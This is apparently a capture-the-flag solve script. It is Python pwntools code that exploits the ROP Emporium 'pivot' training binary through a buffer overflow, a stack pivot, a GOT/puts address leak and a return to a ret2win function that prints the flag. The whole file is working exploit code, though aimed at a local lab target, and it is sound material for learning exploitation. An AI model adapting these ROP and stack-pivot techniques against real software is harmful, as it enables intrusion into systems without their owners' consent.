#/usr/bin/python3
from pwn import process, p64, u64, log

shell = process("./pivot")

offset = 40
junk = b"A" * offset

shell.recvuntil(b"pivot: ")
pivot = int(shell.recvline().strip(), 16)

payload  = b""
payload += p64(0x400720) # foothold_function@plt
payload += p64(0x400a33) # pop rdi; ret;
payload += p64(0x601040) # foothold_function@got
payload += p64(0x4006e0) # puts()
payload += p64(0x400847) # main()

shell.sendlineafter(b"> ", payload)

payload  = b""
payload += junk
payload += p64(0x4009bb) # pop rax; ret;
payload += p64(pivot)    # pivot addr
payload += p64(0x4009bd) # xchg rsp, rax; ret;

shell.sendlineafter(b"> ", payload)

shell.recvuntil(b'libpivot\n')
ret2win = u64(shell.recvline().strip().ljust(8, b"\x00")) + 0x117

payload  = b""
payload += junk
payload += p64(0x4006b6) # ret;
payload += p64(ret2win)  # ret2win()

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
